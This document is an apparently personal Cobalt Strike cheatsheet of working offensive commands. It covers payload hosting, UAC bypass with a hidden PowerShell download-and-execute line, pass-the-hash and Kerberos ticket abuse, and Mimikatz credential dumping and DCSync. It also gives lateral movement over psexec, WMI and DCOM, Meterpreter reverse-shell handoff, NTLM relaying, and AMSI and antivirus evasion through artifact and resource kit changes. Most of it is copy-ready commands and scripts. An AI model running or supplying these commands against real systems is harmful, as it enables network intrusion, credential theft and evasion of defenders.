# Cobalt-Strike cheatsheet.
* [General](#General)
	* [Webserver](#Webserver)
	* [TeamServer](#TeamServer)
	* [Listeners](#Listeners)
	* [Payloads](#Payloads)
* [Command Execution](#Command-Execution)
* [UAC Bypass](#UAC-Bypass)
* [Lateral Movement](#Lateral-Movement)
	* [User impersonation](#User-impersonation)
	* [Techniques](#Techniques)
* [Post Exploitation](#Post-Exploitation)
	* [Credentials](#Credentials)
	* [Session passing](#Session-passing)
* [Pivoting](#Pivoting)
	* [Socksproxy](#Socksproxy)
	* [Using proxychains](#Using-proxychains)
	* [Manual port forwards](#Manual-port-forwards)
	* [NTLMRelaying with CS](#NTLMRelaying-with-cobalt-strike)
* [Evasion](#Evasion)
	* [Malleable C2 profile](#Malleable-C2-profile)
	* [Artifact-kit](#Artifact-kit)
	* [Resource-kit](#Resource-kit)
* [Extending Cobalt Strike](#Extending-Cobalt-Strike)
	* [Agressor scripts](#Agressor-scripts)
	* [Beacon Object Files](#Beacon-Object-Files)

## General
#### Get current user
```
getuid
```

#### Change sleep / Set interactive
- OPSEC Lower sleep = More traffic/Noice = More likely to get caught.
```
sleep <SECONDS>
sleep 0
```

#### Get metadata from beacon
```
checkin
```

#### Kill a beacon
- Right click beacon, then Session --> Exit, then Session --> Eemove

#### Upload and download files
```
upload <FILE>
download <FILE>
```

#### Take screenshots
- View screenshot. Go to View -> Screenshots
```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

#### Keylogger
```
keylogger
```

### Webserver
#### Upload file
- Go to Site Management -> Host File and select your document.
- Set the Location URI, Local Host and click Launch.

#### Check web logs
- Go to View -> Web log

### Teamserver
#### Start teamserver
```
cd /opt/cobaltstrike
sudo ./teamserver <IP> <PASSWORD> <C2 PROFILE>

sudo ./teamserver <IP> <PASSWORD> c2-profiles/normal/webbug.profile
```

### Teamserver service
#### Create service
```
sudo vim /etc/systemd/system/csteamserver.service

[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver <IP> <PASSWORD> <C2 PROFILE>

[Install]
WantedBy=multi-user.target
```

#### Reload service
```
sudo systemctl daemon-reload
sudo systemctl status csteamserver.service
```

#### Start service
```
sudo systemctl start csteamserver.service
sudo systemctl status csteamserver.service
```

#### Enable service
```
sudo systemctl enable teamserver.service
```

### Persisten hosted files
- Hosted files are gone on restart. A solution is to use `agscript` utility with the `artifact_payload` and `site_host` functions.
```
agscript <HOST> <PORT> <USER> <PASSWORD> <path/to/script.cna>

vim host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("<LISTENER NAME>", "<PAYLOAD TYPE>", "<PAYLOAD ARCHITECTURE>");

    # Host payload
    site_host("<LOCAL IP>", <PORT>, "<URI>", $payload, "<MIME TYPE>", "<DESCRIPTION>", <HTTPS [true|false]>);
}
```

```
vim host_payloads.cna

# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}
```

#### Add to startup service
- Add the following line
```
sudo vim /etc/systemd/system/csteamserver.service

ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
```

### Listeners
### Create a listener
- Two type of listeners: `egress` (HTTP(S) and DNS) and `peer-to-peer` (SMB or TCP).
  - `egress` listens on the teamserver IP.
  - `peer-to-peer` listens on a existing beacon.  	
1. In the menu click the HeadPhones Icon or click Cobalt Strike --> Listeners 
2. Click the Add button at the bottom and and a new listener dialogue will appear.
3. Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
4. Set the variables/settings and click Save.
- Creating a TCP local listener is usefull for privescing or spawning new shells

#### Create peer-to-peer listener
- Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.
- Then create payload for the new listener!

### Create pivot listener
- To start a Pivot Listener on an existing Beacon, right-click Pivoting --> Listener.
- Might need to open port on the firewall

#### Connect to pivot listener
- Works like a bind shell. Most used are SMB or TCP.
- Run the payload on the target
- Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
```
connect <IP> <PORT>
link <IP> <PIPE>
```
#### OPSEC listeners
- DNS: Since 0.0.0.0 is the default response (and also rather nonsensical), Cobalt Strike team servers can be fingerprinted in this way.  This can be changed in the Malleable C2 profile.
- SMB: The default pipe name(`msagent_XX`) is quite well signatured. A good strategy is to emulate names known to be used by common applications or Windows itself.  Use `ls \\.\pipe\` to list all currently listening pipes for inspiration.  

### Payloads
#### Create payloads
- Click Payloads --> Select an option or all

#### Powershell payload
- Click Attacks --> Scripted web delivery (S) --> Choose a URI path, listener and select type PowerShell IEX

#### Create dll payload
- Bypasses default applocker configuration
```
C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
link <COMPUTERNAME>
```

#### Create service binary
- Used for privilege escalation with services
- Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
- TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations

#### OPSEC payloads
- Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
- The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.

## Command Execution
#### Execute cmd command
```
run <COMMAND>
```

#### Execute PowerShell command
```
powershell <COMMAND>
```

#### Execute PowerShell command through powerpick
- Bypasses Constrained Language Mode
```
powerpick $ExecutionContext.SessionState.LanguageMode
```

#### Execute assembly in memory
```
execute-assembly <PATH TO EXE>
```

#### Load PowerShell script
```
powershell-import <FILE>
```

## UAC Bypass
- https://github.com/cobalt-strike/ElevateKit
#### UAC bypass
- Typing `elevate` and then tab lets you cycle through the methods.
```
elevate <METHOD> <LISTENER>
elevate uac-schtasks tcp-local
```

#### UAC bypass method 2 runasadmin
```
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
connect localhost 4444
```

## Lateral Movement

#### Portscan
```
portscan <IP OR RANGE> <PORTS>
```

### User impersonation
#### Make token - runas other user
```
make_token <DOMAIN>\<USER> <PASSWORD>
```

#### Rev2self
- Drops impersonation and will undo the make token
```
rev2self
```

#### Steal token
- If a user is running a process on the system, we can steal its process
```
steal_token <PID>
````

#### Inject payload into process
```
inject <PID> <ARCH> <BEACON>
```

#### Spawnas
- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
- Must be run from a folder the user has access to.
- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
```
make_token <DOMAIN>\<USER> <PASSWORD>
spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
```

#### Pass the hash
```
pth <DOMAIN>\<USER> <NTLM HASH>
```

```
mimikatz sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM> /run:"powershell -w hidden"
steal_token <PID>
```

#### Pass the ticket
- OPSEC: By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.
```
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass123

execute-assembly Rubeus.exe ptt /luid:<LUID FROM PREVIOUS COMMAND> /ticket:<BASE64 TICKET>

steal_token <PID OF FIRST COMMAND>
```

#### Overpass the hash
- OPSEC: Use AES256 keys
```
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec

make_token <DOMAIN>\<USER> DummyPass
[System.IO.File]::WriteAllBytes("C:\Users\public\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\public\ticket.kirbi

ls \\<HOSTNAME>\c$
```

#### Overpass the hash elevated context
```
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

#output: [+] ProcessID       : <PID>

steal_token <PID>

ls \\<HOSTNAME>\c$
```

#### Extract and inject ticket, then steal token
- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
```
execute-assembly Rubeus.exe triage
execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
steal_token <PID>
```

#### Load TGT or TGS ticket
```
kerberos_ticket_use <FILE TO TICKET>
```

#### Use ccache file
```
kerberos_ccache_use
```

### Techniques
#### Jump
```
jump [method] [target] [listener]

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

#### Remote-exec
```
remote-exec [method] [target] [command]

    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

### Custom
- Use primitives such as `powershell`, `execute-assembly`, etc to implement something custom with for example an agressor script.

#### Getting the architecture
- for winrm or winrm64 with jump
```
remote-exec winrm <HOSTNAME> (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

#### Jump winrm
```
jump winrm64 <HOSTNAME> <LISTENER>
```

### Jump PSexec
```
jump psexec64 <HOSTNAME> <LISTENER>
```

### WMI
- Not a jump command but can be used manually
- Make sure the firewall is open for the ports used!
```
cd \\<HOSTNAME>\ADMIN$
upload <SMB BEACON EXE>
remote-exec wmi <HOSTNAME> <BEACON EXE>
link <HOSTNAME> <PIPE>
```

```
cd \\<HOSTNAME>\ADMIN$
upload <TCP BEACON EXE>
remote-exec wmi <HOSTNAME> <BEACON EXE>
connect <HOSTNAME> <PORT>
```

#### WMI exec commands
```
remote-exec winrm <HOSTNAME> whoami; hostname
```

#### CoInitializeSecurity
- Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.
- if CoInitializeSecurity has already been called, WMI fails with access denied.
- As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.

```
remote-exec wmi <HOSTNAME> calc.exe
execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Windows\System32\calc.exe"
```

#### DCOM
- https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
```
powershell-import Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command <BEACON EXE>
```

#### SSH
```
ssh
ssh-key
```

## Post Exploitation
### Credentials
- The `!`(Elevate to system) and `@`(Impersonate beacons thread) symbols are modifiers.
- Go to View -> Credentials to see a copy of all the credentials

#### Mimikatz logonpasswords
```
mimikatz !sekurlsa::logonpasswords
logonpasswords
```

#### Mimikatz ekeys
```
mimikatz !sekurlsa::ekeys
```

#### Mimikatz sam
```
mimikatz !lsadump::sam
```

#### Mimikatz Cached Credentials
```
mimikatz !lsadump::cache
```

#### DCSync
```
dcsync <DOMAIN> <DOMAIN\USER>
```

### Session passing
#### Beacon passing
- From one beacon type to another
- Spawn an process and inject shellcode for the specified listener into it.
```
spawn <ARCHITECTURE> <LISTENER>
```

#### Cobalt strike --> Metasploit
- Only supports `x86`
```
sudo msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT <PORT>
exploit -j
```
- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port, Set the name to `msf` and click Save. The command `spawn msf` will pass the session to metasploit.
```
spawn msf
```

#### Cobalt strike --> Metasploit shellcode shinject new process
```
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin

execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 msf.bin
```

#### Cobalt strike --> Metasploit shellcode shspawn new process
```
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_http
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf_http_x64.bin

shspawn x64 C:\Payloads\msf_http_x64.bin
```

### Metasploit --> Cobalt strike
- Go to Attacks --> Packages --> Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```

## Pivoting
### Socksproxy
#### Enable Socksproxy no auth
- OPSEC: This binds the port on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
```
socks <PORT> <SOCKS4/SOCKS5>
```

#### Enable Socksproxy auth
- The enableLogging option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.  Instead, you can use journalctl:
```
socks <PORT> socks5 disableNoAuth <USER> <PASS> enableLogging
```

### Using proxychains
#### Proxychains
- For linux
- Change proxychains config `socks5 <IP> <PORT> <USER> <PASS>`
```
sudo vim /etc/proxychains.conf
proxychains <COMMAND>
```

#### Proxifier
- https://www.proxifier.com/
- For windows
- Open Proxifier, go to Profile -> Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
- Next, go to Profile -> Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
- Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
- NOTE: You will also need to add a static host entry in `C:\Windows\System32\drivers\etc\hosts` file: `<DC IP> <DOMAIN>`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.

#### Proxychains netonly or overpass the hash
```
runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

#### Browser
- Install FoxyProxy https://getfoxyproxy.org/
- Configure Proxy IP and port, Username and Password.
- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/

#### Metasploit
- In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
- Paste string in msfconsole
- Stop with ```socks stop```

### Manual port forwards
#### Remote port forward netsh
- Requires administrator privs
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
```

#### List forwards netsh
```
netsh interface portproxy show v4tov4
```

#### Remove port forward netsh
```
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
```

### Rportfwd
#### Create port forward
- Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
- Does not require administrator privs
- OPSEC: When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule. Have to create firewall rule first!
```
powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>

rportfwd <PORT> <IP> <PORT>
```

#### Stop and remove firewall rule
```
powershell Remove-NetFirewallRule -DisplayName "Test Rule"

rportfwd stop <PORT>
```

#### Create port forward rportfwd_local
- Beacon also has a rportfwd_local command.  Whereas rportfwd will tunnel traffic to the Team Server, rportfwd_local will tunnel the traffic to the machine running the Cobalt Strike client.
- Does not require administrator privs
- If 127.0.0.1 doesn't work use teamserver IP
```
rportfwd_local <PORT> <IP> <PORT>
```
    
#### Stop port forward local
```
rportfwd_local stop <PORT>
```

### NTLMRelaying with cobalt strike
- https://github.com/praetorian-inc/PortBender
- Requires system privs

#### Place portbender driver on the target
```
cd C:\Windows\system32\drivers
upload WinDivert64.sys
```

#### Load portbender.cna
- Load `PortBender.cna` this adds a new PortBender command to the console in Cobalt strike -> Script Manager
- Breaks SMB service on the machine, also SMB Beacons. 
- Create the appropriate inbound firewall rules for 445 (file sharing is disabled by default), 8445, and 8080.
```
help PortBender
PortBender redirect 445 8445
```

#### Create port forward
- Create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).
```
rportfwd 8445 127.0.0.1 445
```

#### Allow 8445 firewall
```
powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8445
```

#### Create sockx proxy
```
socks 1080 socks5 disableNoAuth socks_user socks_password
```

#### NTLMRelay execute command
```
sudo proxychains ntlmrelayx.py -t smb://<TARGET IP> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <PAYLOAD>'
```

#### Stop portbender
```
jobs
jobkill <JID>
kill <PID>
```
 
## Evasion
### Malleable C2 profile
- Example: https://github.com/Cobalt-Strike/Malleable-C2-Profiles
- Changes to C2 profile requires teamserver restart and a new beacon!
- Good changes: https://github.com/WKL-Sec/Malleable-CS-Profiles

#### Check profile for errors
```
./c2lint <PROFILE>
```

### Amsi bypass
#### Add the following to the .profile
- `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It does not apply to the powershell command
```
post-ex {
    set amsi_disable "true";
}
```

### Spawnto
- `rundll32` being the default `spawnto` for Cobalt Strike is a common point of detectiom.
- The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. 

#### Change spawnto
```
spawnto x64 %windir%\sysnative\dllhost.exe
spawnto x86 %windir%\syswow64\dllhost.exe
```

#### Revert spawnto
```
spawnto
```

#### Change spawnto psexec
```
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
```

#### Change service name for psexec
```
ak-settings service <NAME>
```

#### C2 profile
```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

### Artifact-kit
- Used to modify the binary (EXE & DLL) payloads
- Location `cobaltstrike\arsenal-kit\kits\artifact`
- The `src-main/main.c` is the entry points for the EXE artifacts.
- `src-common/bypass-template.c` shows how one can implement some logic inside the start function from `main.c`
- We can use the `bypass-pipe.c` to evade AV.

### Change bypass-pipe.c
```
vim /opt/cobaltstrike/artifact-kit/src-common/bypass-pipe.c
```

### Edit the following line
- Nothing needs to be changed right now, but might want to change the pipe name part. Example:
```
"%c%c%c%c%c%c%c%c%cnetsvc\\%d"
"%c%c%c%c%c%c%c%c%cprintsvc-%d-server"
```

#### Built artifact kit
- Files should go to the client.
```
./build.sh <techniques> <allocator> <stage> <rdll size> <include resource file> <output directory>
./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts
```

#### Load artifact.cna
- Click on Cobalt Strike -> Script Manager -> Load `artifact.cna` from the output directory
- Reload cobaltstrike UI
- Use Payloads -> Windows Stageless Generate All Payloads to replace all 

#### Run threatcheck on payload
```
.\ThreatCheck.exe -f <PAYLOAD>
```

### Resource-kit
- Used to modify script-based payloads including the PowerShell, Python, HTA and VBA templates.
- Location: `cobaltstrike\arsenal-kit\kits\resource`
- Using `template.x64.ps1` is enough.
- Files should go to the client.

#### Change template.x64.ps1
- From --> To
- Change ALL variables in the file
```
for ($zz = 0; $zz -lt $v_code.Count; $zz++) {
	$v_code[$zz] = $v_code[$zz] -bxor 35
}

for ($i = 0; $i -lt $v_service.Count; $i++) {
	$var_service[$i] = $v_service[$i] -bxor 35
}
```

#### Channge compress.ps1
- https://offensivedefence.co.uk/posts/making-amsi-jump/

#### Rebuilt resource kit
```
./build.sh /mnt/c/Tools/cobaltstrike/resources
```

#### Load resources.cna
- Click on Cobalt Strike -> Script Manager -> Load `resources.cna` 
- Reload cobaltstrike UI
- Use Payloads -> Windows Stageless Generate All Payloads to replace all

#### Run threatcheck on payload
```
.\ThreatCheck.exe -f <PAYLOAD> -e AMSI
```

## Extending Cobalt Strike
### Agressor scripts
### Jump and remote-exec
- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register
- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register

#### Jump dcom command
- Using https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

### Beacon Object Files
- Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process.
- BOFs are essentially tiny COFF objects (written in C or C++) on which Beacon acts as a linker and loader. 
- Download https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h
- Usefull BOFs:
  - https://github.com/WKL-Sec/HiddenDesktop
  - https://github.com/trustedsec/CS-Situational-Awareness-BOF
  - https://github.com/CCob/BOF.NET
  - https://github.com/helpsystems/nanodump
  - https://github.com/outflanknl/InlineWhispers
